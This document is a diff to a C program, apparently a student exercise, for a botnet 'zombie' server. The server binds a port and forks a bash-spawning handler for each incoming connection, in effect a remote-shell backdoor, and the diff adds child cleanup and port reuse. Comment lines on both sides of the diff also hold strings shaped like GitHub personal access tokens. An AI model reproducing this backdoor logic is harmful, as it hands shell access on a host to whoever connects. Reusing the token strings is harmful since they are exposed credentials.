@@ -14,7 +14,7 @@
 #include <sys/sem.h>
 #include <sys/shm.h>
 #include <sys/socket.h>
-//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
+//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
 #include "utils_v2.h"
 #include "port.h"
 #include "botNet.h"
@@ -23,8 +23,9 @@ int getFreePort(int sockfd);
 int validPort(int sockfd,int port);
 
 Zombie zombie;
-int tabChild[10];
+int tabChild[BACKLOG];
 int numberChild;
+int tabNewSockFd[BACKLOG];
 
 Zombie initSocketServer(bool withPort, int portReceived){
 int sockfd = ssocket();
@@ -58,13 +59,12 @@ void createBash (void * sock){
 
 }
 
-void done(){
-	printf("frzearezzf\n");
+void doneParent(){
 	for (int i = 0; i < numberChild; ++i){
 		skill(tabChild[i],SIGINT);
+		close(tabNewSockFd[i]);
 	}
 	sclose(zombie.sockFd);
-
 	exit(0);
 }
 
@@ -74,7 +74,7 @@ int main(int argc, char const *argv[]){
 	else 
 		zombie = initSocketServer(false,-1);
 	
-	ssigaction(SIGINT,done);
+	ssigaction(SIGINT,doneParent);
 
 
 	printf("Le serveur tourne sur le port : %i \n", zombie.port);	
@@ -82,14 +82,11 @@ int main(int argc, char const *argv[]){
 
 	while((newsockfd = saccept(zombie.sockFd))>0){	
 		int childId=fork_and_run1(createBash,&newsockfd);
+		tabNewSockFd[numberChild]=newsockfd;
 		tabChild[numberChild]=childId;
 		numberChild++;	
 
 	}
-		
-
-	
-	sclose(zombie.sockFd);
 	return 0;
 }
 
@@ -103,6 +100,8 @@ int getFreePort(int sockfd){
   	addr.sin_family = AF_INET;
   	addr.sin_port = htons(tabPorts[i]);
  	addr.sin_addr.s_addr = htonl(INADDR_ANY);
+ 	int optval = 1;
+	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);
 	int ret = bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
 	if(ret != -1)
 		return tabPorts[i];
